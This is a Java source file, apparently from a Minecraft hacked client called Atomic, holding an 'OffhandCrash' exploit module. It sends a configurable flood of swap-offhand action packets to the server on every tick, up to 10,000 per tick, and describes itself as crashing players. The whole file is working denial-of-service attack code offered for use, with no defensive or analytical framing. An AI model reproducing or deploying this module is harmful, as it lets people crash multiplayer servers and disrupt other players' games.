package me.zeroX150.atomic.feature.module.impl.exploit;

import me.zeroX150.atomic.Atomic;
import me.zeroX150.atomic.feature.module.Module;
import me.zeroX150.atomic.feature.module.ModuleType;
import me.zeroX150.atomic.feature.module.config.SliderValue;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {
    SliderValue a = (SliderValue) this.config.create("Amount",500,10,10000,0).description("How many packets to send per tick");
    public OffhandCrash() {
        super("OffhandCrash", "crashes players with offhand packets", ModuleType.EXPLOIT);
    }

    @Override
    public void tick() {
        try {
            if (Atomic.client.player == null || Atomic.client.getNetworkHandler() == null) throw new Exception();
            PlayerActionC2SPacket p = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
            for(int i = 0;i<a.getValue();i++) {
                Atomic.client.getNetworkHandler().sendPacket(p);
            }
        } catch (Exception ignored) {
            this.setEnabled(false);
        }
    }

    @Override
    public void enable() {

    }

    @Override
    public void disable() {

    }

    @Override
    public String getContext() {
        return (a.getValue()*20)+"";
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}

